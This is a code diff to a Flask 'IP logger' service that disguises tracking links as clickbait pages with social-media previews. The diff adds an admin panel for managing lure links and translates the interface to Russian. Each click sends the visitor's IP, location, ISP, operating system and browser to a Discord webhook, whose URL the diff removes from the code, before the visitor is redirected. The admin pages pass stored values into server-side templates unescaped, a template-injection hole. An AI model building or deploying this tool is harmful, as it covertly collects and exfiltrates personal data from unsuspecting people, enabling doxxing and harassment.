@@ -3,20 +3,33 @@ import base64
 import httpagentparser
 import requests
 import random
-from flask import Flask, request, render_template_string, jsonify
+import sqlite3
+from flask import Flask, request, render_template_string, jsonify, g, session, redirect, url_for
+from dotenv import load_dotenv
+from functools import wraps
+import os
+
+# Загрузка переменных окружения из файла .env
+load_dotenv()
+
+# Использование переменных окружения
+DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
+REAL_URL = os.getenv("REAL_URL")
+REDIRECT_DELAY = int(os.getenv("REDIRECT_DELAY"))
+LOGGING_LEVEL = os.getenv("LOGGING_LEVEL")
+VPN_CHECK = int(os.getenv("VPN_CHECK"))
+ANTI_BOT = int(os.getenv("ANTI_BOT"))
 
 app = Flask(__name__)
+app.secret_key = os.getenv("SECRET_KEY")
 
 # Настройка логирования
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(level=LOGGING_LEVEL)
 
 # Загрузка конфигураций с фиксированными значениями
 CLICKBAIT_TITLE = "😱 ШОК! Ты не поверишь, этот факт скрывался долгие годы..."
 CLICKBAIT_DESCRIPTION = "🔥 Эксклюзив! Это должно было остаться в секрете, но утекло в сеть. Скорее смотри, пока не удалили!"
 CLICKBAIT_IMAGE = "https://avatars.mds.yandex.net/i?id=a4aecf9cbc80023011c1e098ff28befc5fa6d0b6-8220915-images-thumbs&n=13"
-REAL_URL = "https://youtu.be/kk3_5AHEZxE?si=0RnrfrvHJIiHqes7"
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1338142323795824691/ox3HgetuOjqcKx-3AO1X6mb53Y-SfS8MBt3XU2M8GLVcgfNPE85Gk2Y8e5TDVYdsKUwt"
-REDIRECT_DELAY = 5
 
 # Глобальный счётчик кликов
 click_count = 0
@@ -32,13 +45,13 @@ config = {
     "accurateLocation": False,
     "message": {
         "doMessage": False,
-        "message": "Hello world!",
+        "message": "Привет, мир!",
         "richMessage": True,
     },
-    "vpnCheck": 1,
+    "vpnCheck": VPN_CHECK,
     "linkAlerts": True,
     "buggedImage": True,
-    "antiBot": 1,
+    "antiBot": ANTI_BOT,
     "redirect": {
         "redirect": True,
         "page": REAL_URL
@@ -75,9 +88,9 @@ def reportError(error):
         "content": "@everyone",
         "embeds": [
             {
-                "title": "ZeWorld - Error",
+                "title": "ZeWorld - Ошибка",
                 "color": config["color"],
-                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n\n{error}\n",
+                "description": f"Произошла ошибка при попытке залогировать IP!\n\n**Ошибка:**\n\n{error}\n",
             }
         ],
     })
@@ -94,9 +107,9 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
             "content": "",
             "embeds": [
                 {
-                    "title": "Zewardo - linksent",
+                    "title": "Zewardo - ссылка отправлена",
                     "color": config["color"],
-                    "description": f"An **Zewardo** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+                    "description": f"Ссылка **Zewardo** была отправлена в чат!\nСкоро вы можете получить IP.\n\n**Конечная точка:** `{endpoint}`\n**IP:** `{ip}`\n**Платформа:** `{bot}`",
                 }
             ],
         }) if config["linkAlerts"] else None
@@ -107,7 +120,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     try:
         info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
 
-        # Check if 'proxy' key exists in the response
+        # Проверка наличия ключа 'proxy' в ответе
         if 'proxy' in info and info["proxy"]:
             if config["vpnCheck"] == 2:
                 return
@@ -132,7 +145,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 
         os, browser = httpagentparser.simple_detect(useragent)
 
-        # Safely access timezone information
+        # Безопасный доступ к информации о часовом поясе
         timezone_parts = info.get('timezone', 'Unknown/Unknown').split('/')
         timezone_name = timezone_parts[1].replace('_', ' ') if len(timezone_parts) > 1 else 'Unknown'
         timezone_region = timezone_parts[0] if len(timezone_parts) > 1 else 'Unknown'
@@ -142,28 +155,28 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
             "content": ping,
             "embeds": [
                 {
-                    "title": "Zewardo - IP Logged",
+                    "title": "Zewardo - IP залогирован",
                     "color": config["color"],
-                    "description": f"""**A User Opened the Original Image!**
+                    "description": f"""**Пользователь открыл оригинальное изображение!**
 
-**Endpoint:** `{endpoint}`
+**Конечная точка:** `{endpoint}`
 
-**IP Info:**
+**Информация об IP:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info.get('isp', 'Unknown')}`
+> **Провайдер:** `{info.get('isp', 'Unknown')}`
 > **ASN:** `{info.get('as', 'Unknown')}`
-> **Country:** `{info.get('country', 'Unknown')}`
-> **Region:** `{info.get('regionName', 'Unknown')}`
-> **City:** `{info.get('city', 'Unknown')}`
-> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{timezone_name}` ({timezone_region})
-> **Mobile:** `{info.get('mobile', 'Unknown')}`
+> **Страна:** `{info.get('country', 'Unknown')}`
+> **Регион:** `{info.get('regionName', 'Unknown')}`
+> **Город:** `{info.get('city', 'Unknown')}`
+> **Координаты:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Приблизительные' if not coords else 'Точные, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Часовой пояс:** `{timezone_name}` ({timezone_region})
+> **Мобильный:** `{info.get('mobile', 'Unknown')}`
 > **VPN:** `{info.get('proxy', 'Unknown')}`
-> **Bot:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
+> **Бот:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else 'Возможно' if info.get('hosting') else 'False'}`
 
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
+**Информация о ПК:**
+> **ОС:** `{os}`
+> **Браузер:** `{browser}`
 
 **User Agent:**
 ```
@@ -179,8 +192,183 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
         return info
 
     except Exception as e:
-        logging.error(f"Error processing IP info: {e}")
+        logging.error(f"Ошибка при обработке информации об IP: {e}")
         return
+
+def get_db():
+    if 'db' not in g:
+        g.db = sqlite3.connect('links.db')
+        g.db.row_factory = sqlite3.Row
+    return g.db
+
+@app.teardown_appcontext
+def close_db(e=None):
+    db = g.pop('db', None)
+    if db is not None:
+        db.close()
+
+def init_db():
+    with app.app_context():
+        db = get_db()
+        cursor = db.cursor()
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS links (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                path TEXT UNIQUE NOT NULL,
+                title TEXT NOT NULL,
+                description TEXT NOT NULL,
+                image_url TEXT NOT NULL,
+                redirect_url TEXT NOT NULL,
+                redirect_delay INTEGER DEFAULT 5,
+                click_count INTEGER DEFAULT 0
+            )
+        ''')
+        existing = cursor.execute('SELECT COUNT(*) FROM links').fetchone()[0]
+        if existing == 0:
+            cursor.execute('''
+                INSERT INTO links (path, title, description, image_url, redirect_url, redirect_delay)
+                VALUES (?, ?, ?, ?, ?, ?)
+            ''', (
+                'XzAc24',
+                CLICKBAIT_TITLE,
+                CLICKBAIT_DESCRIPTION,
+                CLICKBAIT_IMAGE,
+                REAL_URL,
+                REDIRECT_DELAY
+            ))
+        db.commit()
+
+# Инициализация БД при запуске
+init_db()
+
+def login_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if not session.get('logged_in'):
+            return redirect(url_for('admin_login'))
+        return f(*args, **kwargs)
+    return decorated_function
+
+@app.route('/admin/login', methods=['GET', 'POST'])
+def admin_login():
+    if request.method == 'POST':
+        if (request.form['username'] == os.getenv("ADMIN_USERNAME") and
+            request.form['password'] == os.getenv("ADMIN_PASSWORD")):
+            session['logged_in'] = True
+            return redirect(url_for('admin_dashboard'))
+        return "Неверные данные", 401
+    return render_template_string('''
+        <form method="post">
+            Username: <input type="text" name="username"><br>
+            Password: <input type="password" name="password"><br>
+            <input type="submit" value="Login">
+        </form>
+    ''')
+
+@app.route('/admin/logout')
+def admin_logout():
+    session.pop('logged_in', None)
+    return redirect(url_for('admin_login'))
+
+@app.route('/admin')
+@login_required
+def admin_dashboard():
+    db = get_db()
+    links = db.execute('SELECT * FROM links').fetchall()
+    links_html = "<table><tr><th>Path</th><th>Title</th><th>Clicks</th><th>Actions</th></tr>"
+    for link in links:
+        links_html += f"""
+        <tr>
+            <td>{link['path']}</td>
+            <td>{link['title']}</td>
+            <td>{link['click_count']}</td>
+            <td>
+                <a href="/admin/links/{link['id']}/edit">Edit</a>
+                <form method="POST" action="/admin/links/{link['id']}/delete">
+                    <button type="submit">Delete</button>
+                </form>
+            </td>
+        </tr>
+        """
+    links_html += "</table>"
+    return render_template_string(f'''
+        <h1>Admin Dashboard</h1>
+        <a href="/admin/links/new">Add New Link</a>
+        {links_html}
+    ''')
+
+@app.route('/admin/links/new', methods=['GET', 'POST'])
+@login_required
+def new_link():
+    if request.method == 'POST':
+        db = get_db()
+        cursor = db.cursor()
+        cursor.execute('''
+            INSERT INTO links (path, title, description, image_url, redirect_url, redirect_delay)
+            VALUES (?, ?, ?, ?, ?, ?)
+        ''', (
+            request.form['path'],
+            request.form['title'],
+            request.form['description'],
+            request.form['image_url'],
+            request.form['redirect_url'],
+            request.form['redirect_delay']
+        ))
+        db.commit()
+        return redirect(url_for('admin_dashboard'))
+    return render_template_string('''
+        <form method="post">
+            Path: <input type="text" name="path"><br>
+            Title: <input type="text" name="title"><br>
+            Description: <input type="text" name="description"><br>
+            Image URL: <input type="text" name="image_url"><br>
+            Redirect URL: <input type="text" name="redirect_url"><br>
+            Redirect Delay: <input type="number" name="redirect_delay"><br>
+            <input type="submit" value="Create">
+        </form>
+    ''')
+
+@app.route('/admin/links/<int:id>/edit', methods=['GET', 'POST'])
+@login_required
+def edit_link(id):
+    db = get_db()
+    link = db.execute('SELECT * FROM links WHERE id = ?', (id,)).fetchone()
+    if request.method == 'POST':
+        cursor = db.cursor()
+        cursor.execute('''
+            UPDATE links SET path = ?, title = ?, description = ?, image_url = ?, redirect_url = ?, redirect_delay = ?
+            WHERE id = ?
+        ''', (
+            request.form['path'],
+            request.form['title'],
+            request.form['description'],
+            request.form['image_url'],
+            request.form['redirect_url'],
+            request.form['redirect_delay'],
+            id
+        ))
+        db.commit()
+        return redirect(url_for('admin_dashboard'))
+    return render_template_string(f'''
+        <form method="post">
+            Path: <input type="text" name="path" value="{link['path']}"><br>
+            Title: <input type="text" name="title" value="{link['title']}"><br>
+            Description: <input type="text" name="description" value="{link['description']}"><br>
+            Image URL: <input type="text" name="image_url" value="{link['image_url']}"><br>
+            Redirect URL: <input type="text" name="redirect_url" value="{link['redirect_url']}"><br>
+            Redirect Delay: <input type="number" name="redirect_delay" value="{link['redirect_delay']}"><br>
+            <input type="submit" value="Update">
+        </form>
+    ''')
+
+@app.route('/admin/links/<int:id>/delete', methods=['POST'])
+@login_required
+def delete_link(id):
+    db = get_db()
+    cursor = db.cursor()
+    cursor.execute('DELETE FROM links WHERE id = ?', (id,))
+    db.commit()
+    return redirect(url_for('admin_dashboard'))
 
 @app.route('/')
 def home():
@@ -228,110 +416,112 @@ def home():
     """
     return render_template_string(html_content)
 
-@app.route('/XzAc24')
-def clickbait_page():
+@app.route('/<custom_path>')
+def handle_custom_link(custom_path):
     try:
-        global click_count
-        click_count += 1
+        db = get_db()
+        link = db.execute('SELECT * FROM links WHERE path = ?', (custom_path,)).fetchone()
+        if link is None:
+            return "Ссылка не найдена", 404
 
-        # Получение IP и User-Agent пользователя
+        db.execute('UPDATE links SET click_count = click_count + 1 WHERE id = ?', (link['id'],))
+        db.commit()
+
         user_ip = request.remote_addr
         user_agent = request.headers.get('User-Agent')
-
-        # Логирование IP в Discord
         makeReport(user_ip, user_agent, endpoint=request.path)
 
         html_content = f"""
-                <!DOCTYPE html>
-                <html lang="ru">
-                <head>
-                    <meta charset="UTF-8">
-                    <title>{CLICKBAIT_TITLE}</title>
-                    <!-- Open Graph Meta Tags -->
-                    <meta property="og:title" content="{CLICKBAIT_TITLE}">
-                    <meta property="og:description" content="{CLICKBAIT_DESCRIPTION}">
-                    <meta property="og:image" content="{CLICKBAIT_IMAGE}">
-                    <meta property="og:url" content="{request.url}">
-                    <meta property="og:type" content="website">
-                    <!-- Twitter Cards -->
-                    <meta name="twitter:card" content="summary_large_image">
-                    <meta name="twitter:title" content="{CLICKBAIT_TITLE}">
-                    <meta name="twitter:description" content="{CLICKBAIT_DESCRIPTION}">
-                    <meta name="twitter:image" content="{CLICKBAIT_IMAGE}">
-                    <style>
-                        body {{
-                            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-                            text-align: center;
-                            background: linear-gradient(45deg, #ff416c, #ff4b2b);
-                            color: white;
-                            height: 100vh;
-                            margin: 0;
-                            display: flex;
-                            flex-direction: column;
-                            align-items: center;
-                            justify-content: center;
-                            animation: fadeIn 2s ease;
-                        }}
-                        h1 {{
-                            font-size: 3em;
-                            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-                            margin-bottom: 20px;
-                        }}
-                        p {{
-                            font-size: 1.5em;
-                            margin: 10px 0;
-                        }}
-                        .spinner {{
-                            border: 6px solid rgba(255, 255, 255, 0.3);
-                            border-top: 6px solid white;
-                            border-radius: 50%;
-                            width: 50px;
-                            height: 50px;
-                            animation: spin 1s linear infinite;
-                            margin: 20px auto;
-                        }}
-                        @keyframes fadeIn {{
-                            from {{ opacity: 0; }}
-                            to {{ opacity: 1; }}
-                        }}
-                        @keyframes spin {{
-                            0% {{ transform: rotate(0deg); }}
-                            100% {{ transform: rotate(360deg); }}
-                        }}
-                        .button {{
-                            background: white;
-                            color: #ff416c;
-                            border: none;
-                            padding: 15px 30px;
-                            font-size: 1.2em;
-                            border-radius: 10px;
-                            cursor: pointer;
-                            margin-top: 20px;
-                            transition: background 0.3s, color 0.3s;
-                        }}
-                        .button:hover {{
-                            background: #ff4b2b;
-                            color: white;
-                        }}
-                    </style>
-                    <script>
-                        setTimeout(function() {{
-                            window.location.href = "{REAL_URL}";
-                        }}, {REDIRECT_DELAY * 1000});
-                    </script>
-                </head>
-                <body>
-                    <h1>{CLICKBAIT_TITLE}</h1>
-                    <p>Ты в шоке? 😱 Через {REDIRECT_DELAY} секунд ты узнаешь правду!</p>
-                    <div class="spinner"></div>
-                    <button class="button" onclick="window.location.href='{REAL_URL}'">Узнать правду</button>
-                </body>
-                </html>
-                """
+        <!DOCTYPE html>
+        <html lang="ru">
+        <head>
+            <meta charset="UTF-8">
+            <title>{link['title']}</title>
+            <!-- Open Graph Meta Tags -->
+            <meta property="og:title" content="{link['title']}">
+            <meta property="og:description" content="{link['description']}">
+            <meta property="og:image" content="{link['image_url']}">
+            <meta property="og:url" content="{request.url}">
+            <meta property="og:type" content="website">
+            <!-- Twitter Cards -->
+            <meta name="twitter:card" content="summary_large_image">
+            <meta name="twitter:title" content="{link['title']}">
+            <meta name="twitter:description" content="{link['description']}">
+            <meta name="twitter:image" content="{link['image_url']}">
+            <style>
+                body {{
+                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                    text-align: center;
+                    background: linear-gradient(45deg, #ff416c, #ff4b2b);
+                    color: white;
+                    height: 100vh;
+                    margin: 0;
+                    display: flex;
+                    flex-direction: column;
+                    align-items: center;
+                    justify-content: center;
+                    animation: fadeIn 2s ease;
+                }}
+                h1 {{
+                    font-size: 3em;
+                    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+                    margin-bottom: 20px;
+                }}
+                p {{
+                    font-size: 1.5em;
+                    margin: 10px 0;
+                }}
+                .spinner {{
+                    border: 6px solid rgba(255, 255, 255, 0.3);
+                    border-top: 6px solid white;
+                    border-radius: 50%;
+                    width: 50px;
+                    height: 50px;
+                    animation: spin 1s linear infinite;
+                    margin: 20px auto;
+                }}
+                @keyframes fadeIn {{
+                    from {{ opacity: 0; }}
+                    to {{ opacity: 1; }}
+                }}
+                @keyframes spin {{
+                    0% {{ transform: rotate(0deg); }}
+                    100% {{ transform: rotate(360deg); }}
+                }}
+                .button {{
+                    background: white;
+                    color: #ff416c;
+                    border: none;
+                    padding: 15px 30px;
+                    font-size: 1.2em;
+                    border-radius: 10px;
+                    cursor: pointer;
+                    margin-top: 20px;
+                    transition: background 0.3s, color 0.3s;
+                }}
+                .button:hover {{
+                    background: #ff4b2b;
+                    color: white;
+                }}
+            </style>
+            <script>
+                setTimeout(function() {{
+                    window.location.href = "{link['redirect_url']}";
+                }}, {link['redirect_delay'] * 1000});
+            </script>
+        </head>
+        <body>
+            <h1>{link['title']}</h1>
+            <p>Ты в шоке? 😱 Через {link['redirect_delay']} секунд ты узнаешь правду!</p>
+            <div class="spinner"></div>
+            <button class="button" onclick="window.location.href='{link['redirect_url']}'">Узнать правду</button>
+        </body>
+        </html>
+        """
         return render_template_string(html_content)
     except Exception as e:
-        logging.error(f"Error in /sosish route: {e}")
-        return "An internal error occurred", 500
+        logging.error(f"Ошибка: {e}")
+        return "Ошибка", 500
 
 if __name__ == '__main__':
     host = "0.0.0.0"
